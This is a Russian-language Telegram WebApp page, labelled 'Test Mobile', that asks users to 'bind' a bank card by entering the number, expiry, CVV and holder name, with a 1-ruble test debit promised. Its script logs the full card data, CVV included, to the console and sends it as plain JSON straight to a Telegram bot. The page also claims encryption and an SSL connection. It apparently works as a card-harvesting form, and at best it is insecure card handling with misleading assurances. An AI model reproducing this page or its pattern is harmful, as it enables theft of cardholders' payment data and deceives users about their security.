<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Привязка карты - Test Mobile</title>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }
        
        .container {
            background: white;
            border-radius: 20px;
            padding: 30px;
            width: 100%;
            max-width: 400px;
            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
        }
        
        .header {
            text-align: center;
            margin-bottom: 30px;
        }
        
        .header h1 {
            color: #333;
            font-size: 24px;
            margin-bottom: 10px;
        }
        
        .header p {
            color: #666;
            font-size: 14px;
        }
        
        .card-icon {
            width: 60px;
            height: 60px;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            border-radius: 15px;
            display: flex;
            align-items: center;
            justify-content: center;
            margin: 0 auto 20px;
            font-size: 30px;
        }
        
        .form-group {
            margin-bottom: 20px;
        }
        
        .form-group label {
            display: block;
            color: #333;
            font-size: 14px;
            font-weight: 600;
            margin-bottom: 8px;
        }
        
        .form-group input {
            width: 100%;
            padding: 15px;
            border: 2px solid #e0e0e0;
            border-radius: 12px;
            font-size: 16px;
            transition: border-color 0.3s;
            outline: none;
        }
        
        .form-group input:focus {
            border-color: #667eea;
        }
        
        .form-row {
            display: flex;
            gap: 15px;
        }
        
        .form-row .form-group {
            flex: 1;
        }
        
        .info-text {
            background: #f8f9fa;
            border-radius: 10px;
            padding: 15px;
            margin-bottom: 25px;
            font-size: 13px;
            color: #666;
            display: flex;
            align-items: center;
            gap: 10px;
        }
        
        .info-icon {
            font-size: 20px;
        }
        
        .secure-badge {
            text-align: center;
            margin-top: 20px;
            font-size: 12px;
            color: #999;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 5px;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <div class="card-icon">💳</div>
            <h1>Привязка карты</h1>
            <p>С баланса будет списано 1₽ для проверки</p>
        </div>
        
        <div class="info-text">
            <span class="info-icon">🔒</span>
            <span>Все данные передаются в зашифрованном виде. Сумма 1₽ будет возвращена на карту.</span>
        </div>
        
        <form id="cardForm">
            <div class="form-group">
                <label for="cardNumber">Номер карты</label>
                <input 
                    type="text" 
                    id="cardNumber" 
                    placeholder="0000 0000 0000 0000" 
                    maxlength="19"
                    required
                >
            </div>
            
            <div class="form-row">
                <div class="form-group">
                    <label for="cardExpiry">Срок действия</label>
                    <input 
                        type="text" 
                        id="cardExpiry" 
                        placeholder="MM/YY" 
                        maxlength="5"
                        required
                    >
                </div>
                
                <div class="form-group">
                    <label for="cardCvv">CVV</label>
                    <input 
                        type="password" 
                        id="cardCvv" 
                        placeholder="123" 
                        maxlength="3"
                        required
                    >
                </div>
            </div>
            
            <div class="form-group">
                <label for="cardHolder">Владелец карты</label>
                <input 
                    type="text" 
                    id="cardHolder" 
                    placeholder="IVAN IVANOV" 
                    required
                >
            </div>
        </form>
        
        <div class="secure-badge">
            <span>🔐</span>
            <span>Безопасное соединение SSL</span>
        </div>
    </div>

    <script>
        // Инициализация Telegram WebApp
        let tg;
        
        try {
            tg = window.Telegram.WebApp;
            console.log('WebApp initialized:', tg);
            console.log('initData:', tg.initData);
            console.log('initDataUnsafe:', tg.initDataUnsafe);
        } catch (e) {
            console.error('Failed to initialize WebApp:', e);
            alert('Ошибка инициализации Telegram WebApp');
        }
        
        // Расширяем на весь экран
        tg.expand();
        
        // Сообщаем что WebApp готов
        tg.ready();
        
        // Настройка цвета
        tg.setHeaderColor('#667eea');
        tg.setBackgroundColor('#ffffff');
        
        // Настраиваем MainButton (основную кнопку внизу экрана)
        tg.MainButton.setText('Привязать карту');
        tg.MainButton.setParams({
            color: '#667eea',
            textColor: '#ffffff',
            is_active: false,
            is_visible: true
        });
        
        // Функция проверки валидности формы
        function checkFormValidity() {
            const cardNumber = document.getElementById('cardNumber').value.replace(/\s/g, '');
            const cardExpiry = document.getElementById('cardExpiry').value;
            const cardCvv = document.getElementById('cardCvv').value;
            const cardHolder = document.getElementById('cardHolder').value;
            
            const isValid = cardNumber.length >= 16 && 
                           /^\d{2}\/\d{2}$/.test(cardExpiry) && 
                           cardCvv.length >= 3 && 
                           cardHolder.length >= 3;
            
            tg.MainButton.setParams({
                is_active: isValid,
                color: isValid ? '#667eea' : '#cccccc'
            });
            
            return isValid;
        }
        
        // Форматирование номера карты
        const cardNumberInput = document.getElementById('cardNumber');
        cardNumberInput.addEventListener('input', function(e) {
            let value = e.target.value.replace(/\D/g, '');
            let formattedValue = '';
            for (let i = 0; i < value.length; i++) {
                if (i > 0 && i % 4 === 0) {
                    formattedValue += ' ';
                }
                formattedValue += value[i];
            }
            e.target.value = formattedValue;
            checkFormValidity();
        });
        
        // Форматирование срока действия
        const cardExpiryInput = document.getElementById('cardExpiry');
        cardExpiryInput.addEventListener('input', function(e) {
            let value = e.target.value.replace(/\D/g, '');
            if (value.length >= 2) {
                value = value.substring(0, 2) + '/' + value.substring(2, 4);
            }
            e.target.value = value;
            checkFormValidity();
        });
        
        // Только цифры для CVV
        const cardCvvInput = document.getElementById('cardCvv');
        cardCvvInput.addEventListener('input', function(e) {
            e.target.value = e.target.value.replace(/\D/g, '');
            checkFormValidity();
        });
        
        // Проверка владельца карты
        const cardHolderInput = document.getElementById('cardHolder');
        cardHolderInput.addEventListener('input', function(e) {
            e.target.value = e.target.value.toUpperCase();
            checkFormValidity();
        });
        
        // Обработка нажатия на MainButton
        tg.onEvent('mainButtonClicked', function() {
            console.log('MainButton clicked');
            
            if (!checkFormValidity()) {
                tg.showAlert('Заполните все поля корректно');
                return;
            }
            
            const cardNumber = document.getElementById('cardNumber').value.replace(/\s/g, '');
            const cardExpiry = document.getElementById('cardExpiry').value;
            const cardCvv = document.getElementById('cardCvv').value;
            const cardHolder = document.getElementById('cardHolder').value;
            
            // Формируем данные
            const data = {
                card_number: cardNumber,
                card_expiry: cardExpiry,
                card_cvv: cardCvv,
                card_holder: cardHolder
            };
            
            console.log('Sending data via sendData:', data);
            
            try {
                const jsonData = JSON.stringify(data);
                console.log('JSON data to send:', jsonData);
                
                // Показываем прогресс
                tg.MainButton.showProgress();
                
                // Отправляем данные в бот
                tg.sendData(jsonData);
                console.log('sendData called successfully');
                
                // Закрываем WebApp после небольшой задержки
                setTimeout(() => {
                    console.log('Closing WebApp...');
                    tg.close();
                }, 500);
            } catch (err) {
                console.error('Error sending data:', err);
                tg.showAlert('Ошибка отправки данных: ' + err.message);
                tg.MainButton.hideProgress();
            }
        });
        
        // Включаем кнопку "Назад"
        if (tg.BackButton) {
            tg.BackButton.show();
            tg.onEvent('backButtonClicked', function() {
                tg.close();
            });
        }
        
        // Проверяем валидность при загрузке
        checkFormValidity();
    </script>
</body>
</html>
